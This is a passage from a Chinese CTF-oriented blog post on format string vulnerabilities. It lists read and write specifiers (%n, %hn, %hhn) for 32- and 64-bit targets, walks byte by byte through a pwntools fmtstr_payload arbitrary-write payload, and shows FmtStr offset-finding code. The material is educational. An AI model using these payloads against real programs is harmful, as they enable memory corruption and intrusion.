class="line">这部分来自icemakr的博客</span><br><span class="line"></span><br><span class="line">32位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$x&apos;.format(index)           // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 同上面</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">////////////////////////////</span><br><span class="line">64位</span><br><span class="line"></span><br><span class="line">读</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$x&apos;.format(index, num)      // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$lx&apos;.format(index, num)     // 读8个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 读8个字节</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br><span class="line">写</span><br><span class="line"></span><br><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line"></span><br><span class="line">%1$lx: RSI</span><br><span class="line">%2$lx: RDX</span><br><span class="line">%3$lx: RCX</span><br><span class="line">%4$lx: R8</span><br><span class="line">%5$lx: R9</span><br><span class="line">%6$lx: 栈上的第一个QWORD</span><br></pre></td></tr></table></figure>
+<p>我们可以通过%{}$hhn来一字节一字节的写入。举个例子，我们希望向0x08048000写入值0x10203040，在pwntools里，我们可以用命令fmtstr_payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; fmtstr_payload(6, &#123;0x08048000:0x10203040&#125;)</span><br><span class="line">&apos;\x00\x80\x04\x08\x01\x80\x04\x08\x02\x80\x04\x08\x03\x80\x04\x08%48c%6$hhn%240c%7$hhn%240c%8$hhn%240c%9$hhn&apos;</span><br></pre></td></tr></table></figure>
+<p>即开头为四个地址的小段表示加一堆格式化字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\x00\x80\x04\x08</span><br><span class="line">\x01\x80\x04\x08</span><br><span class="line">\x02\x80\x04\x08</span><br><span class="line">\x03\x80\x04\x08</span><br><span class="line">%48c%6$hhn</span><br><span class="line">%240c%7$hhn</span><br><span class="line">%240c%8$hhn</span><br><span class="line">%240c%9$hhn</span><br></pre></td></tr></table></figure>
+<p>即对0x08048000写入16+48 = 64 = 0x40<br>对0x08048000写入0x40+240 = 304 = (uint8)0x130 = 0x30<br>…</p>
+<p>但这个payload以0x00开头，应该是传不过去的，还是要人工写。</p>
+<hr>
+<h2 id="pwntools相关模块的使用"><a href="#pwntools相关模块的使用" class="headerlink" title="pwntools相关模块的使用"></a>pwntools相关模块的使用</h2><p>对于格式化字符串漏洞，pwntools有模块fmtstr</p>
+<p>docs地址：<a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="noopener">http://pwntools.readthedocs.io/en/stable/fmtstr.html</a></p>
+<p>对于这个模块，我只能说建议手写，至少你要懂原理才去用这个模块，不然就是脚本小子。</p>
+<p>例如之前测试某个程序格式化字符串的偏移位置时，我们是采用手动测试，直到输出字符串前4字节的16进制值为止。pwntools则有函数<strong>FmtStr</strong>。</p>
+<p>首先你要自己写一个函数，能够不断输入格式化字符串来测试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#pwntools的示例</span><br><span class="line">&gt;&gt;&gt; def exec_fmt(payload):</span><br><span class="line">...     p = process(program)</span><br><span class="line">...     p.sendline(payload)</span><br><span class="line">...     return p.recvall()</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; autofmt = FmtStr(exec_fmt)</span><br><span class="line">&gt;&gt;&gt; offset = autofmt.offset</span><br><span class="line">#此处的offset就是我们需要找的偏移值</span><br></pre></td></tr></table></figure>
+<p>生成任意地址写的payload的函数：<strong>fmtstr_payload</strong></p>
+<p>示例代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># we want to do 3 writes</span><br><span class="line">writes = &#123;0x08041337:   0xbfffffff,</span><br><span class="line">          0x08041337+4: 0x1337babe,</span><br><span class="line">          0x08041337+8: 0xdeadbeef&#125;</span><br><span class="line"></span><br><span class="line"># the printf() call already writes some bytes</span><br><span class="line"># for example :</span><br><span class="line"># strcat(dest, &quot;blabla :&quot;, 256);</span><br><span class="line"># strcat(dest, your_input, 256);</span><br><span class="line"># printf(dest);</span><br><span class="line"># Here, numbwritten parameter must be 8</span><br><span class="line">payload = fmtstr_payload(5, writes, numbwritten=8)</span><br></pre></td></tr></table></figure>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫">
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝"></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信"></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/04/01/什么是格式化字符串/">fmtstr</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Alpaca 的个人博客">Alpaca</a></p>
+        <p><span>发布时间:</span>2019年04月01日 - 00时00分</p>
+        <p><span>最后更新:</span>2019年04月02日 - 19时02分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/01/什么是格式化字符串/" title="fmtstr">http://yoursite.com/2019/04/01/什么是格式化字符串/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/04/01/什么是格式化字符串/　　作者: Alpaca" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2019/04/01/python/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          python
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/04/01/Docker/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Docker</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是格式化字符串"><span class="toc-number">1.</span> <span class="toc-text">什么是格式化字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实现任意地址读"><span class="toc-number">3.</span> <span class="toc-text">实现任意地址读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实现任意地址写"><span class="toc-number">4.</span> <span class="toc-text">实现任意地址写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools相关模块的使用"><span class="toc-number">5.</span> <span class="toc-text">pwntools相关模块的使用</span></a></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/04/01/python/" title="上一篇: python">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2019/04/01/Docker/" title="下一篇: Docker">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/Z3/">自动化解题神器————z3</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/angr/">自动化解题神器————Angr</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/base64/">base64</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/pwnable/">pwnable</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/CTF_WIKI_PWN总结/">CTF_WIKI_PWN!</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/gdb/">Gdb</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/一些技巧/">杂货铺</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/栈溢出/">栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/pwntools/">pwntools</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/python/">python</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/什么是格式化字符串/">fmtstr</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/01/Docker/">Docker</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 Alpaca
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+        <script>
+            var now = new Date(); 
+            function createtime() { 
+                var grt= new Date("04/01/2019 23:05:00");//在此处修改你的建站时间
+                now.setTime(now.getTime()+250); 
+                days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+                hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+                if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+                mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+                seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+                snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+                document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+                document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+            } 
+        setInterval("createtime()",250);
+        </script>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+</html>
